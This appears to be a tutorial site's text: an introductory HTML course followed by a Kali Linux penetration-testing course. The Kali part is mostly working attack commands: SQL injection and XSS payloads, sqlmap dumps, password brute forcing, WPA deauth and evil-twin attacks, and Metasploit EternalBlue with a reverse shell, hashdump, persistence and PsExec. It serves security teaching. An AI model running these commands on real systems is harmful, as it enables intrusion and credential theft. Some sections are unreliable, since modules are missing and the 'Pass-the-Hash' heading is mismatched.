Module 1: HTML Basics

Learn the fundamental building blocks of HTML, including tags, elements, and document structure.

What is HTML?

HTML (HyperText Markup Language) is the standard language used to create and structure content on the web. It forms the backbone of every website, defining elements like text, images, links, and layout to make content visible and organized in browsers.

HTML elements are the building blocks of HTML pages and are represented by tags.

Provides the basic framework for all web pages.
Uses opening and closing tags to define elements.
Allows adding hyperlinks, images, audio, and video.
Attributes give extra information about elements like src, href, or alt.
HTTP is the mechanism by which HTML documents are transported across the internet.

Basic HTML Document Structure

Every HTML document follows a basic structure:

<!DOCTYPE html>
<html>
<head>
  <title>Page Title</title>
</head>
<body>
  <h1>My First Heading</h1>
  <p>My first paragraph.</p>
</body>
</html>

Let's break down each part:

  • <!DOCTYPE html>: Declares the document type and version of HTML
  • <html>: The root element of an HTML page
  • <head>: Contains meta information about the document
  • <title>: Specifies a title for the document
  • <body>: Contains the visible page content

HTML Elements and Tags

HTML elements are defined by a start tag, some content, and an end tag:

<tagname>Content goes here...</tagname>

Examples of HTML elements:

<h1>This is a heading</h1>
<p>This is a paragraph.</p>
<a href="https://www.example.com">This is a link</a>

Some important points about HTML elements:

  • HTML tags are not case sensitive, but lowercase is recommended
  • Some elements are empty (have no content and no closing tag)
  • Elements can be nested (contain other elements)

HTML Attributes

Attributes provide additional information about HTML elements. They are always specified in the start tag and usually come in name/value pairs like name="value".

<a href="https://www.example.com">Visit Example.com</a>

In this example, href is an attribute that specifies the URL the link goes to.

Common attributes include:

  • id: Specifies a unique id for an element
  • class: Specifies one or more class names for an element
  • style: Specifies an inline CSS style for an element
  • src: Specifies the source for embedded content
  • alt: Specifies alternative text for images

Module 2: Text Formatting

Master text elements, headings, paragraphs, lists, and semantic text markup.

Headings

HTML provides six levels of headings, from <h1> to <h6>. <h1> defines the most important heading, while <h6> defines the least important.

<h1>This is heading 1</h1>
<h2>This is heading 2</h2>
<h3>This is heading 3</h3>
<h4>This is heading 4</h4>
<h5>This is heading 5</h5>
<h6>This is heading 6</h6>

Important notes about headings:

  • Search engines use headings to index the structure and content of your web pages
  • Use headings to show the document structure (not to make text big or bold)
  • Each page should have one <h1> element for the main heading

Paragraphs and Line Breaks

The <p> element defines a paragraph. Browsers automatically add some white space (a margin) before and after each paragraph.

<p>This is a paragraph.</p>
<p>This is another paragraph.</p>

The <br> tag inserts a single line break. It is an empty tag, which means it has no end tag.

<p>This is<br>a paragraph<br>with line breaks.</p>

Text Formatting Elements

HTML provides various elements for formatting text with special meaning:

<b> - Bold text
<strong> - Important text
<i> - Italic text
<em> - Emphasized text
<mark> - Marked text
<small> - Smaller text
<del> - Deleted text
<ins> - Inserted text
<sub> - Subscript text
<sup> - Superscript text

Note: <b> and <i> define bold and italic text without any extra importance, while <strong> and <em> indicate that the content has strong importance or emphasis.

Lists

HTML provides three types of lists:

Unordered Lists

An unordered list starts with the <ul> tag. Each list item starts with the <li> tag.

<ul>
  <li>Coffee</li>
  <li>Tea</li>
  <li>Milk</li>
</ul>

Ordered Lists

An ordered list starts with the <ol> tag. Each list item starts with the <li> tag.

<ol>
  <li>Coffee</li>
  <li>Tea</li>
  <li>Milk</li>
</ol>

Description Lists

A description list is a list of terms, with a description of each term.

<dl>
  <dt>Coffee</dt>
  <dd>- black hot drink</dd>
  <dt>Milk</dt>
  <dd>- white cold drink</dd>
</dl>

Module 3: Links and Navigation

Create hyperlinks, navigation menus, and understand URL structures.

HTML Links - Hyperlinks

HTML links are defined with the <a> tag. The link's destination is specified in the href attribute.

<a href="https://www.example.com">Visit Example.com</a>

By default, links will appear as follows in all browsers:

  • An unvisited link is underlined and blue
  • A visited link is underlined and purple
  • An active link is underlined and red

You can change the link colors using CSS.

The target Attribute

By default, the linked page will be displayed in the current browser window. To change this, you can use the target attribute.

<a href="https://www.example.com" target="_blank">Visit Example.com in a new tab</a>
<a href="https://www.example.com" target="_self">Visit Example.com in the same tab (default)</a>
<a href="https://www.example.com" target="_parent">Visit Example.com in the parent frame</a>
<a href="https://www.example.com" target="_top">Visit Example.com in the full body of the window</a>

target="_blank" is commonly used to open links in a new tab or window.

Absolute vs. Relative URLs

URLs can be either absolute or relative:

Absolute URLs

An absolute URL contains the full address of the resource, including the protocol (http/https) and domain name.

<a href="https://www.example.com/products/index.html">Products</a>

Relative URLs

A relative URL points to a file relative to the current page. They don't include the domain name.

<a href="about.html">About Us</a> (same folder)
<a href="pages/contact.html">Contact</a> (in a subfolder)
<a href="../index.html">Home</a> (in a parent folder)
<a href="/products">Products</a> (root-relative)

Relative URLs are commonly used for internal links within the same website.

Link Types

Links can point to different types of resources:

Email Links

Create a link that opens the user's email program:

<a href="mailto:someone@example.com">Send email</a>

Telephone Links

Create a link that dials a phone number on mobile devices:

<a href="tel:+1234567890">Call us</a>

Download Links

Create a link to download a file:

<a href="files/document.pdf" download>Download PDF</a>

Creating Navigation Menus

A common use for links is to create navigation menus. Typically, navigation menus are created using unordered lists with links.

<nav>
  <ul>
    <li><a href="index.html">Home</a></li>
    <li><a href="about.html">About</a></li>
    <li><a href="services.html">Services</a></li>
    <li><a href="contact.html">Contact</a></li>
  </ul>
</nav>

The <nav> element is a semantic HTML5 tag that defines a set of navigation links.

Module 4: Images and Media

Embed images, audio, and video content into your web pages.

HTML Images

Images can improve the design and appearance of a web page. The HTML <img> tag is used to embed an image in a web page.

<img src="image.jpg" alt="Description of image">

The src attribute specifies the path to the image, and the alt attribute provides alternative text for the image.

Image Attributes

Common image attributes include:

  • src: Specifies the path to the image
  • alt: Specifies an alternate text for the image
  • width: Specifies the width of the image
  • height: Specifies the height of the image
  • title: Specifies extra information about the image
<img src="photo.jpg" alt="A beautiful landscape" width="500" height="300" title="Mountain View">

Image Formats

Common web image formats:

  • JPEG: Best for photographs
  • PNG: Best for graphics with transparency
  • GIF: Best for simple animations
  • SVG: Best for vector graphics
  • WebP: Modern format with better compression

Audio in HTML

The HTML <audio> element is used to play audio files.

<audio controls>
  <source src="audio.mp3" type="audio/mpeg">
  <source src="audio.ogg" type="audio/ogg">
  Your browser does not support the audio element.
</audio>

Common audio attributes:

  • controls: Adds audio controls (play, pause, volume)
  • autoplay: Audio will start playing as soon as it's ready
  • loop: Audio will start over again when finished
  • muted: Audio output will be muted

Video in HTML

The HTML <video> element is used to show a video on a web page.

<video width="320" height="240" controls>
  <source src="movie.mp4" type="video/mp4">
  <source src="movie.ogg" type="video/ogg">
  Your browser does not support the video tag.
</video>

Common video attributes:

  • controls: Adds video controls (play, pause, volume)
  • autoplay: Video will start playing as soon as it's ready
  • loop: Video will start over again when finished
  • muted: Video output will be muted
  • poster: Specifies an image to be shown while video is downloading

Module 5: Tables

Create structured data tables with headers, rows, columns, and captions.

HTML Tables

HTML tables allow you to arrange data into rows and columns. Tables are created with the <table> tag.

<table>
  <tr>
    <th>Header 1</th>
    <th>Header 2</th>
  </tr>
  <tr>
    <td>Data 1</td>
    <td>Data 2</td>
  </tr>
</table>

Table Elements

Key table elements:

  • <table>: Defines the table
  • <tr>: Defines a table row
  • <th>: Defines a table header cell
  • <td>: Defines a table data cell
  • <caption>: Defines a table caption
  • <thead>: Groups header content
  • <tbody>: Groups body content
  • <tfoot>: Groups footer content

Table Attributes

Common table attributes:

<table border="1"> - Adds border to table
<td colspan="2"> - Cell spans 2 columns
<td rowspan="2"> - Cell spans 2 rows
<th scope="col"> - Header applies to column
<th scope="row"> - Header applies to row

Advanced Table Example

<table border="1">
  <caption>Monthly Sales Report</caption>
  <thead>
    <tr>
      <th scope="col">Month</th>
      <th scope="col">Sales</th>
      <th scope="col">Profit</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>January</td>
      <td>$1000</td>
      <td>$200</td>
    </tr>
  </tbody>
</table>

Module 6: Forms and Input

Build interactive forms with various input types, labels, and validation.

HTML Forms

HTML forms are used to collect user input. The <form> element defines a form.

<form action="/submit" method="post">
  <label for="name">Name:</label>
  <input type="text" id="name" name="name">
  <input type="submit" value="Submit">
</form>

Form Attributes

Important form attributes:

  • action: Specifies where to send form data
  • method: Specifies HTTP method (GET or POST)
  • target: Specifies where to display response
  • autocomplete: Enables/disables autocomplete
  • novalidate: Specifies form should not be validated

Input Types

Common input types:

<input type="text"> - Single-line text input
<input type="password"> - Password field
<input type="email"> - Email address field
<input type="number"> - Numerical input
<input type="date"> - Date picker
<input type="checkbox"> - Checkbox
<input type="radio"> - Radio button
<input type="file"> - File upload
<input type="submit"> - Submit button
<input type="reset"> - Reset button

Other Form Elements

Additional form elements:

<textarea> - Multi-line text input
<select> - Dropdown list
<option> - Option in dropdown
<fieldset> - Groups related elements
<legend> - Caption for fieldset
<label> - Label for input
<button> - Clickable button

Form Validation

HTML5 provides built-in form validation:

<input type="text" required> - Field is required
<input type="email"> - Must be valid email
<input type="number" min="1" max="10"> - Number range
<input type="text" pattern="[A-Za-z]{3}"> - Pattern matching
<input type="text" maxlength="10"> - Maximum length

Module 7: Semantic HTML

Use semantic elements to create meaningful, accessible web structures.

What is Semantic HTML?

Semantic HTML uses elements that clearly describe their meaning in a human- and machine-readable way. This improves accessibility, SEO, and code maintainability.

Benefits of semantic HTML:

  • Better accessibility for screen readers
  • Improved SEO (Search Engine Optimization)
  • Easier code maintenance and readability
  • Better device compatibility

Semantic Elements

HTML5 introduced several semantic elements:

<header> - Introductory content
<nav> - Navigation links
<main> - Main content
<section> - Thematic grouping
<article> - Self-contained composition
<aside> - Tangentially related content
<footer> - Closing content
<figure> - Self-contained flow content
<figcaption> - Caption for figure
<time> - Machine-readable time
<mark> - Highlighted text

Semantic Structure Example

<header>
  <h1>Website Title</h1>
  <nav>
    <ul>
      <li><a href="#home">Home</a></li>
      <li><a href="#about">About</a></li>
    </ul>
  </nav>
</header>

<main>
  <article>
    <h2>Article Title</h2>
    <p>Article content...</p>
  </article>

  <aside>
    <h3>Related Links</h3>
    <ul>
      <li><a href="#">Link 1</a></li>
    </ul>
  </aside>
</main>

<footer>
  <p>© 2023 Company Name</p>
</footer>

Accessibility Features

Semantic HTML works well with accessibility attributes:

<nav aria-label="Main navigation"> - Labels for screen readers
<main role="main"> - Explicit role definition
<img alt="Description"> - Alternative text
<button aria-label="Close menu"> - Button description
<input aria-required="true"> - Required field indication

Module 8: HTML5 Features

Explore advanced HTML5 elements, APIs, and modern web capabilities.

What is HTML5?

HTML5 is the latest version of HTML, introducing new elements, attributes, and behaviors that provide better structure, multimedia support, and advanced features for modern web applications.

Key improvements in HTML5 include:

  • New semantic elements
  • Native audio and video support
  • Canvas for drawing graphics
  • Local storage capabilities
  • Geolocation API
  • Improved form controls

HTML5 Semantic Elements

HTML5 introduced semantic elements that clearly define different parts of a web page:

<header> - Defines a header for a document or section
<nav> - Defines navigation links
<section> - Defines a section in a document
<article> - Defines an independent, self-contained content
<aside> - Defines content aside from the main content
<footer> - Defines a footer for a document or section
<main> - Defines the main content of a document
<figure> and <figcaption> - Defines figures with captions

Example of semantic structure:

<header>
  <h1>Website Title</h1>
  <nav>...</nav>
</header>
<main>
  <article>
    <h2>Article Title</h2>
    <p>Article content...</p>
  </article>
</main>
<footer>
  <p>Copyright information</p>
</footer>

HTML5 Multimedia Elements

HTML5 provides native support for audio and video without requiring plugins:

Video Element

<video width="320" height="240" controls>
  <source src="movie.mp4" type="video/mp4">
  <source src="movie.ogg" type="video/ogg">
  Your browser does not support the video tag.
</video>

Audio Element

<audio controls>
  <source src="audio.mp3" type="audio/mpeg">
  <source src="audio.ogg" type="audio/ogg">
  Your browser does not support the audio element.
</audio>

HTML5 Canvas

The <canvas> element is used to draw graphics, on the fly, via JavaScript:

<canvas id="myCanvas" width="200" height="100" style="border:1px solid #000000;">
  Your browser does not support the HTML canvas tag.
</canvas>

<script>
  var canvas = document.getElementById("myCanvas");
  var ctx = canvas.getContext("2d");
  ctx.fillStyle = "#FF0000";
  ctx.fillRect(0, 0, 150, 75);
</script>

HTML5 Form Enhancements

HTML5 introduced new input types and attributes for better form validation and user experience:

New Input Types

<input type="email"> - For email addresses
<input type="url"> - For web addresses
<input type="number"> - For numerical input
<input type="range"> - For slider controls
<input type="date"> - For date selection
<input type="color"> - For color selection
<input type="search"> - For search fields

New Form Attributes

placeholder - Hint text in input fields
required - Makes field mandatory
autofocus - Automatically focuses on the field
pattern - Specifies a regex pattern for validation
min/max - Sets minimum/maximum values for numbers
step - Specifies legal number intervals

HTML5 APIs

HTML5 introduced several JavaScript APIs for enhanced functionality:

  • Geolocation API - Gets the user's geographical position
  • Web Storage API - Stores data locally in the browser
  • Web Workers - Runs scripts in background threads
  • Drag and Drop API - Makes elements draggable
  • Server-Sent Events - Allows servers to push updates to clients

Module 1: Introduction to Kali Linux

Learn about Kali Linux, its purpose in ethical hacking, and how to set up your environment.

What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for digital forensics and penetration testing. It comes pre-installed with numerous security and forensics tools.

Key features of Kali Linux:

  • More than 600 penetration testing tools pre-installed
  • Free and always will be
  • Open source Git tree for transparency
  • FHS compliant for easy file navigation
  • Wide-ranging wireless device support
  • Custom kernel patched for injection
  • Developed in a secure environment
  • GPG signed packages and repositories
  • Multi-language support
  • Completely customizable

Structure

In this module, we will cover the following topics:

  • Free and always will be
  • Open source Git tree for transparency
  • FHS compliant for easy file navigation

  • Customizing your Kali Linux environment
  • Package management in Kali Linux
  • Updating and upgrading Kali Linux

Installing Kali Linux

There are several ways to install and use Kali Linux:

Option 1: Bare Metal Installation

Direct installation on your computer hardware. This provides the best performance but requires dedicating a machine to Kali Linux.

Option 2: Virtual Machine

Install Kali Linux as a virtual machine using software like VirtualBox or VMware. This is the recommended approach for beginners.

Option 3: Live Boot

Boot Kali Linux from a USB drive without installing it on your hard drive. Your changes won't persist after shutdown.

Option 4: Kali Linux on WSL

Run Kali Linux through Windows Subsystem for Linux (WSL). Limited functionality compared to full installation.

Option 5: Cloud Image

Run Kali Linux on cloud platforms like AWS, Azure, or Google Cloud.

Basic Kali Linux Commands

Essential commands for navigating and using Kali Linux:

pwd # Print working directory

cd # Change directory

Kali Linux Tools Overview

Kali Linux includes tools organized into various categories:

  • Information Gathering: Nmap, Recon-ng, Maltego

  • Database Assessment: SQLmap, Sqlninja, Oscanner
  • Password Attacks: John the Ripper, Hashcat, Hydra
  • Wireless Attacks: Aircrack-ng, Kismet, Wifite
  • Reverse Engineering: Ghidra, Radare2, JD-GUI
  • Exploitation Tools: Metasploit Framework, BeEF, Social Engineer Toolkit
  • Sniffing & Spoofing: Wireshark, Ettercap, Bettercap
  • Post Exploitation: Meterpreter, Powersploit, Empire
  • Forensics: Autopsy, Binwalk, Volatility
  • Reporting Tools: Dradis, Metagoofil, Faraday

Module 2: Information Gathering

Master reconnaissance techniques to gather intelligence about target systems.

Passive Information Gathering

Passive reconnaissance involves collecting information without directly interacting with the target system.

WHOIS Lookup

WHOIS databases contain registration information about domain names, IP addresses, and autonomous systems.

whois example.com # Get domain registration info
whois 192.168.1.1 # Get IP address info

DNS Enumeration

DNS enumeration helps discover hosts, subdomains, and other DNS records associated with a domain.

dnsenum example.com # Enumerate DNS information
dnsrecon -d example.com # DNS reconnaissance tool
fierce --domain example.com # DNS reconnaissance

Search Engine Reconnaissance

Use search engines to find information about the target:

  • Google dorking with specific search operators
  • Shodan for finding specific devices and services
  • Wayback Machine for historical website data

Active Information Gathering

Active reconnaissance involves directly interacting with the target system to gather information.

Network Scanning with Nmap

Nmap (Network Mapper) is a powerful network discovery and security auditing tool.

nmap -sS 192.168.1.0/24 # TCP SYN scan on subnet
nmap -sV 192.168.1.1 # Version detection
nmap -O 192.168.1.1 # OS detection
nmap -A 192.168.1.1 # Aggressive scan
nmap -p 1-1000 192.168.1.1 # Scan specific ports
nmap --script vuln 192.168.1.1 # Vulnerability scripts

Service Enumeration

Identify services running on discovered ports:

nmap -sV -sC 192.168.1.1 # Version and default scripts
enum4linux 192.168.1.1 # Enumerate Windows/Samba hosts
smbclient -L //192.168.1.1 # List SMB shares

Advanced Reconnaissance Tools

Recon-ng

A full-featured web reconnaissance framework written in Python.

recon-ng # Start Recon-ng
[recon-ng] > modules search # Search for modules
[recon-ng] > modules load recon/domains-hosts/google_site_web
[recon-ng][google_site_web] > set SOURCE example.com
[recon-ng][google_site_web] > run

Maltego

A proprietary software used for open-source intelligence and forensics.

  • Graphical interface for information gathering
  • Automates the process of data mining
  • Visualizes relationships between pieces of information

TheHarvester

Gathers emails, subdomains, hosts, employee names, open ports and banners from different public sources.

theharvester -d example.com -b google # Search Google
theharvester -d example.com -l 500 -b all # All sources, limit 500

Module 3: Vulnerability Analysis

Learn to identify and assess security vulnerabilities in systems and networks.

Vulnerability Scanning Concepts

Vulnerability scanning is the process of identifying security weaknesses and misconfigurations in systems, networks, and applications.

Types of vulnerability scans:

  • Network Vulnerability Scans: Identify vulnerabilities in network devices and services
  • Web Application Scans: Find security issues in web applications
  • Database Scans: Identify misconfigurations and vulnerabilities in databases
  • Host-based Scans: Check individual systems for security issues

Vulnerability scanning methodology:

  1. Discovery: Identify active hosts and services
  2. Port scanning: Determine open ports and services
  3. Service detection: Identify service versions
  4. Vulnerability detection: Check for known vulnerabilities
  5. Reporting: Document findings and recommendations

Network Vulnerability Scanning

Nmap Vulnerability Scripting

Nmap includes scripts for vulnerability detection:

nmap --script vuln 192.168.1.1 # Run all vulnerability scripts
nmap --script safe 192.168.1.1 # Run non-intrusive scripts
nmap --script "http-*" 192.168.1.1 # Run all HTTP scripts

OpenVAS

OpenVAS (Open Vulnerability Assessment System) is a full-featured vulnerability scanner.

# Access web interface at https://127.0.0.1:9392
# Create a new target and scan task
# Review scan results and generate reports

Nessus

A proprietary vulnerability scanner with extensive vulnerability checks.

  • Comprehensive vulnerability database

Web Application Vulnerability Scanning

Nikto

Nikto is an open-source web server scanner that tests for dangerous files/CGIs, outdated server software, and other problems.

nikto -h http://example.com # Basic scan
nikto -h http://example.com -p 80,443 # Specific ports
nikto -h http://example.com -Tuning 1,2,3,4,5,6,7,8,9,0,a,b,c # All tests

OWASP ZAP

The OWASP Zed Attack Proxy (ZAP) is one of the world's most popular free security tools for finding vulnerabilities in web applications.

  • Automated scanner
  • Manual testing tools
  • REST API for automation
  • Extensible through add-ons

WPScan

WPScan is a black box WordPress vulnerability scanner.

wpscan --url http://example.com # Basic WordPress scan

SQL Injection

SQL injection occurs when an attacker can insert malicious SQL code into a query.

# Example vulnerable query:
# SELECT * FROM users WHERE username = '$username' AND password = '$password'

# SQL injection payload:
# username: admin' --
# Resulting query: SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''

Cross-Site Scripting (XSS)

XSS allows attackers to inject client-side scripts into web pages viewed by other users.

# Example XSS payload:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

  • Sequencer: Analyze session token randomness

SQLmap

SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.

sqlmap -u "http://example.com/page.php?id=1" -D database --tables # List tables
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump # Dump table

Dirb and Dirbuster

Tools for discovering hidden directories and files on web servers.

dirb http://example.com # Basic directory brute force
dirb http://example.com /usr/share/dirb/wordlists/common.txt # Custom wordlist

Module 6: Password Attacks

Master various password cracking techniques and tools available in Kali Linux.

Password Security Fundamentals

Understanding how passwords are stored and protected:

Password Storage Methods

  • Plain Text: Passwords stored without encryption (insecure)
  • Hashing: One-way encryption (MD5, SHA1, SHA256)
  • Salted Hashing: Hash with random data added (more secure)
  • Key Derivation Functions: bcrypt, PBKDF2, Argon2

Common Password Hashes

# MD5: 32 characters (hexadecimal)
# Example: 5d41402abc4b2a76b9719d911017c592

# SHA1: 40 characters (hexadecimal)
# Example: aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d

# SHA256: 64 characters (hexadecimal)
# Example: 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824

Password Cracking Techniques

Dictionary Attacks

Using pre-compiled lists of common passwords:

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

Brute Force Attacks

Trying all possible character combinations:

john --incremental hashes.txt
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a # 6 character brute force

Rule-Based Attacks

Applying transformation rules to dictionary words:

john --wordlist=wordlist.txt --rules hashes.txt
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

Hybrid Attacks

Combining dictionary words with brute force patterns:

hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d # Dictionary + 3 digits
hashcat -m 0 -a 7 hashes.txt ?d?d?d wordlist.txt # 3 digits + Dictionary

Password Cracking Tools

John the Ripper

A fast password cracker supporting many hash types:

john hashes.txt # Default attack
john --format=raw-md5 hashes.txt # Specify hash format
john --show hashes.txt # Show cracked passwords
john --wordlist=wordlist.txt --rules hashes.txt # Wordlist with rules

Hashcat

The world's fastest and most advanced password recovery utility:

hashcat -m 0 hashes.txt wordlist.txt # MD5 cracking
hashcat -m 1000 hashes.txt wordlist.txt # NTLM cracking
hashcat -m 2500 hashes.txt wordlist.txt # WPA/WPA2 cracking
hashcat -I # Show available hardware
hashcat -b # Benchmark

Hydra

A parallelized login cracker which supports numerous protocols:

hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
hydra -L users.txt -P passwords.txt 192.168.1.1 ssh
hydra -l administrator -P passwords.txt 192.168.1.1 smb

Online Password Attacks

Web Application Login Attacks

Tools for attacking web application authentication:

burpsuite # Use Intruder for login brute force
patator http_fuzz url=http://example.com/login.php method=POST body='user=admin&pass=FILE0' 0=passwords.txt -x ignore:fgrep='Invalid password'

SSH and Telnet Attacks

Attacking remote access services:

medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh
ncrack -u admin -P passwords.txt ssh://192.168.1.1

Module 7: Wireless Attacks

Wireless Networking Fundamentals

Understanding wireless network protocols and security:

Wireless Standards

  • 802.11a: 5 GHz, 54 Mbps
  • 802.11b: 2.4 GHz, 11 Mbps
  • 802.11g: 2.4 GHz, 54 Mbps
  • 802.11n: 2.4/5 GHz, 600 Mbps
  • 802.11ac: 5 GHz, 1.3 Gbps
  • 802.11ax (Wi-Fi 6): 2.4/5 GHz, 10 Gbps

Wireless Security Protocols

  • WEP: Wired Equivalent Privacy (broken)
  • WPA: Wi-Fi Protected Access (TKIP)
  • WPA2: Wi-Fi Protected Access 2 (CCMP/AES)
  • WPA3: Latest security standard

Wireless Reconnaissance

Wireless Network Discovery

Tools for discovering wireless networks:

airmon-ng # List wireless interfaces
airmon-ng start wlan0 # Put interface in monitor mode
airodump-ng wlan0mon # Capture wireless traffic

Wireless Packet Analysis

Analyzing wireless network traffic:

airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon # Capture specific network
wireshark # Analyze captured packets

Wireless Attack Techniques

WEP Cracking

WEP is vulnerable to several attacks:

aireplay-ng -1 0 -a 00:11:22:33:44:55 -h 11:22:33:44:55:66 wlan0mon # Fake authentication
aireplay-ng -3 -b 00:11:22:33:44:55 -h 11:22:33:44:55:66 wlan0mon # ARP request replay
aircrack-ng -b 00:11:22:33:44:55 capture-01.cap # Crack WEP key

WPA/WPA2 Cracking

WPA/WPA2 attacks require capturing the handshake:

airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon # Capture handshake
aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 11:22:33:44:55:66 wlan0mon # Deauth attack
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture-01.cap # Crack handshake

WPS Attacks

Wi-Fi Protected Setup vulnerabilities:

wash -i wlan0mon # Find WPS-enabled networks
reaver -i wlan0mon -b 00:11:22:33:44:55 -vv # WPS PIN attack
bully -b 00:11:22:33:44:55 wlan0mon # Alternative WPS tool

Advanced Wireless Attacks

Evil Twin Attacks

Creating rogue access points:

airbase-ng -a 00:11:22:33:44:55 --essid "Free WiFi" -c 6 wlan0mon # Create rogue AP
dnsmasq -C dnsmasq.conf # DHCP and DNS server

KARMA Attacks

Responding to probe requests from clients:

karma # KARMA attack tool

WPA3 Attacks

Emerging attacks against WPA3:

  • Dragonblood vulnerabilities
  • Downgrade attacks
  • Side-channel attacks

Module 8: Exploitation & Post-Exploitation

Master exploitation techniques and maintaining access after successful penetration.

Exploitation Fundamentals

Understanding the exploitation process:

Vulnerability to Exploit

The process of turning a vulnerability into a working exploit:

  1. Vulnerability Discovery
  2. Exploit Development
  3. Payload Delivery
  4. Exploit Execution
  5. Post-Exploitation

Types of Exploits

  • Remote Code Execution (RCE): Execute code on a remote system
  • Local Privilege Escalation (LPE): Gain higher privileges on a local system
  • Denial of Service (DoS): Make a service unavailable
  • Web Application Exploits: Target web applications and services

Metasploit Framework

The Metasploit Framework is the most widely used penetration testing tool:

Metasploit Components

  • Exploits: Code that uses a vulnerability
  • Payloads: Code that runs after successful exploitation
  • Auxiliary Modules: Scanning, fuzzing, and other tools
  • Encoders Avoid detection by antivirus software
  • Post-Exploitation Modules: Actions after gaining access

Basic Metasploit Usage

msfconsole # Start Metasploit
msf6 > search eternalblue # Search for exploits
msf6 > use exploit/windows/smb/ms17_010_eternalblue # Select exploit
msf6 > set RHOSTS 192.168.1.1 # Set target
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp # Set payload
msf6 > set LHOST 192.168.1.100 # Set listener IP
msf6 > exploit # Launch exploit

Post-Exploitation Techniques

Meterpreter

Meterpreter is an advanced, multi-function payload:

meterpreter > sysinfo # System information
meterpreter > getuid # Current user
meterpreter > hashdump # Dump password hashes
meterpreter > shell # Get system shell
meterpreter > upload /local/file C:\\remote\\path # Upload file
meterpreter > download C:\\file.txt /local/path # Download file

Privilege Escalation

Techniques for gaining higher privileges:

meterpreter > getsystem # Attempt privilege escalation
meterpreter > run post/windows/gather/enum_logged_on_users # Enumerate users
meterpreter > run post/multi/recon/local_exploit_suggester # Suggest exploits

Persistence

Maintaining access after initial compromise:

meterpreter > run persistence -U -i 10 -p 443 -r 192.168.1.100 # Create persistence
meterpreter > run post/windows/manage/persistence_exe # Alternative method

Lateral Movement

Pass-the-Hash

Using password hashes to authenticate without knowing the plaintext password:

meterpreter > use incognito # Load incognito
meterpreter > list_tokens -u # List available tokens
meterpreter > impersonate_token DOMAIN\\Administrator # Impersonate token

PSExec

Executing processes on remote systems:

msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 192.168.1.2
msf6 > set SMBUser administrator
msf6 > set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
msf6 > exploit
